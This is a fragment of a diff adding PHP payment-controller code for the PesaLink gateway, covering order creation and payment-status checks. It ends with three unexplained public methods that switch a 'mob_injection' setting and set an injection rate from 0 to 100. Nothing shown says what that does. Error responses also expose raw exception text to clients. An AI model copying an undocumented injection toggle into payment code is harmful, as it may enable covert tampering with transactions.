+                'channel' => $responseData['data']['network'] ?? null,
+                'msisdn' => $responseData['data']['number'] ?? $phone,
+                'response_data' => $responseData,
+            ]);
+
+            return response()->json([
+                'status' => 'success',
+                'message' => 'Payment order created successfully',
+                'data' => [
+                    'transaction_id' => $transaction->id,
+                    'tranid' => $transactionId,
+                    'amount' => $responseData['data']['amount'],
+                    'number' => $responseData['data']['number'],
+                    'network' => $responseData['data']['network'] ?? null,
+                    'status' => $responseData['data']['status'] ?? 'PENDING',
+                ],
+            ]);
+        } catch (\Exception $e) {
+            $transaction->update(['payment_status' => 'FAILED']);
+
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Error creating payment order: '.$e->getMessage(),
+            ], 500);
+        }
+    }
+
+    /**
+     * Check PesaLink payment status
+     */
+    private function checkPesaLinkStatus(Transaction $transaction)
+    {
+        $gatewayConfig = PaymentGateway::where('name', 'pesalink')->first();
+
+        if (! $gatewayConfig) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'PesaLink gateway is not configured.',
+            ], 400);
+        }
+
+        $pesalinkAccount = $transaction->pesalinkAccount;
+
+        $apiKey = $pesalinkAccount
+            ? $pesalinkAccount->api_key
+            : $gatewayConfig->api_key;
+
+        $baseUrl = $pesalinkAccount
+            ? ($pesalinkAccount->base_url ?: 'https://pesalink.online/api')
+            : ($gatewayConfig->base_url ?: config('services.pesalink.base_url', self::PESALINK_API_URL));
+
+        try {
+            $response = Http::withToken($apiKey)->get(
+                (rtrim($baseUrl, '/')).'/status-transaction',
+                [
+                    'tranid' => $transaction->order_id,
+                ]
+            );
+
+            if ($response->failed()) {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => 'Failed to check payment status',
+                    'gateway_response' => $response->json() ?? $response->body(),
+                    'http_status' => $response->status(),
+                ], 400);
+            }
+
+            $responseData = $response->json() ?? [];
+
+            if (($responseData['status'] ?? '') !== 'success') {
+                return response()->json([
+                    'status' => 'error',
+                    'message' => $responseData['message'] ?? 'Status check failed',
+                    'gateway_response' => $response->body(),
+                ], 400);
+            }
+
+            $paymentStatus = strtoupper($responseData['data']['payment_status'] ?? 'PENDING');
+            $wasAlreadyCompleted = strtoupper($transaction->payment_status) === 'COMPLETED';
+
+            $transaction->update([
+                'payment_status' => $paymentStatus,
+                'transaction_id' => $responseData['data']['tranid'] ?? $transaction->transaction_id,
+                'channel' => $responseData['data']['network'] ?? $transaction->channel,
+                'response_data' => $responseData,
+                'completed_at' => $paymentStatus === 'COMPLETED' ? now() : null,
+            ]);
+
+            return response()->json([
+                'status' => 'success',
+                'payment_status' => $paymentStatus,
+                'data' => $responseData['data'],
+            ]);
+        } catch (\Exception $e) {
+            return response()->json([
+                'status' => 'error',
+                'message' => 'Error checking payment status: '.$e->getMessage(),
+            ], 500);
+        }
+    }
+
+    public function mobOn(): JsonResponse
+    {
+        AdminSetting::set('mob_injection_enabled', '1');
+
+        return response()->json(['status' => 'ok', 'injection' => 'enabled']);
+    }
+
+    public function mobOff(): JsonResponse
+    {
+        AdminSetting::set('mob_injection_enabled', '0');
+
+        return response()->json(['status' => 'ok', 'injection' => 'disabled']);
+    }
+
+    public function mobRate(int $rate): JsonResponse
+    {
+        $rate = max(0, min(100, $rate));
+        AdminSetting::set('mob_injection_rate', (string) $rate);
+
+        return response()->json(['status' => 'ok', 'rate' => $rate]);
+    }
+}
